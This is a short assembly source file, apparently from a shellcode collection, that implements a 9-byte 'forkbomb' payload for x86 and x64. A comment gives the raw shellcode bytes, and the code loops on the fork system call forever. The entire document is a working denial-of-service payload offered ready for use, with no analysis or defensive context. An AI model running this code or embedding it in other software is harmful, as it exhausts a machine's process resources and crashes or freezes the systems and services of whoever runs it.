# /* Basic forkbomb (both x86 and x64 compatible) - Length: 9 bytes */
# char shellcode[] = "\x6a\x02\x5b\x53\x58\xcd\x80\xeb\xfa";

.if ARCH == 64
	.set Ebx, %rbx
	.set Eax, %rax
.else
	.set Ebx, %ebx
	.set Eax, %eax
.endif

.text
.globl _start
_start:
	push   $0x2
	pop    Ebx
loop:
	push   Ebx
	pop    Eax
	int    $0x80
	jmp    loop
